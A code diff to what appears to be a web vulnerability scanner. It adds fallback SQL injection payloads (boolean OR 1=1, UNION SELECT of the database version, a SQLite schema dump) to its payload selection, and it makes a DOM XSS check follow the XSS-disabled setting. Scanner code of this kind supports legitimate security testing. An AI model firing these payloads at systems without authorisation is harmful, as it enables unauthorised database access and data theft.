@@ -4767,6 +4767,23 @@ DBMS_SQLI_PAYLOADS = {
     ],
 }
 
+SQLI_CROSS_DBMS_FALLBACK_PAYLOADS = [
+    ("' OR 1=1-- -", "boolean", "MySQL-style boolean injection"),
+    ("' UNION SELECT NULL,@@version,NULL-- -", "version", "MySQL version extraction"),
+    ("')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--", "schema_dump", "SQLite schema extraction"),
+]
+
+
+def _select_sqli_payloads(dbms_key: str | None) -> list[tuple[str, str, str]]:
+    selected_key = dbms_key or "generic"
+    payloads = list(DBMS_SQLI_PAYLOADS.get(selected_key, DBMS_SQLI_PAYLOADS["generic"]))
+    seen = {(payload, technique) for payload, technique, _ in payloads}
+    for payload, technique, description in SQLI_CROSS_DBMS_FALLBACK_PAYLOADS:
+        if (payload, technique) not in seen:
+            payloads.append((payload, technique, description))
+            seen.add((payload, technique))
+    return payloads
+
 # Context-specific XSS payloads with WAF bypass variants
 # Each payload is (payload, technique_name, description)
 CONTEXT_XSS_PAYLOADS = {
@@ -5441,7 +5458,7 @@ async def smart_sqli_test(
 
         # Get appropriate payloads
         dbms_key = results["dbms_detected"] or "generic"
-        payloads = DBMS_SQLI_PAYLOADS.get(dbms_key, DBMS_SQLI_PAYLOADS["generic"])
+        payloads = _select_sqli_payloads(dbms_key)
 
         for param in params[:max_params_per_endpoint]:
             if _budget_exhausted():
@@ -5560,7 +5577,7 @@ async def smart_sqli_test(
 
         # Get appropriate payloads
         dbms_key = results["dbms_detected"] or "generic"
-        payloads = DBMS_SQLI_PAYLOADS.get(dbms_key, DBMS_SQLI_PAYLOADS["generic"])
+        payloads = _select_sqli_payloads(dbms_key)
 
         print(f"[sqli] Testing {method} endpoint: {endpoint_url} with params: {body_params[:max_params_per_endpoint]}", file=sys.stderr)
 
@@ -7020,13 +7037,23 @@ async def run_smart_active_tests(
             "reason": "xss_tests_disabled",
         }
 
-    # Hash route DOM XSS always runs in smart scans (not gated by run_xss)
-    # because it's a distinct vulnerability class requiring browser verification
-    hash_route_results = await hash_route_dom_xss_test(
-        endpoints,
-        max_endpoints=xss_max_endpoints,
-        max_params_per_endpoint=xss_max_params
-    )
+    # Hash-route DOM XSS is part of XSS coverage. Keep it in default smart
+    # scans, but honor focused SQLi-only scans.
+    if run_xss:
+        hash_route_results = await hash_route_dom_xss_test(
+            endpoints,
+            max_endpoints=xss_max_endpoints,
+            max_params_per_endpoint=xss_max_params
+        )
+    else:
+        hash_route_results = {
+            "findings": [],
+            "endpoints_tested": 0,
+            "params_tested": 0,
+            "vulnerabilities_found": 0,
+            "skipped": True,
+            "reason": "xss_tests_disabled",
+        }
 
     # Combine findings
     sqli_findings = sqli_results.get("findings", [])
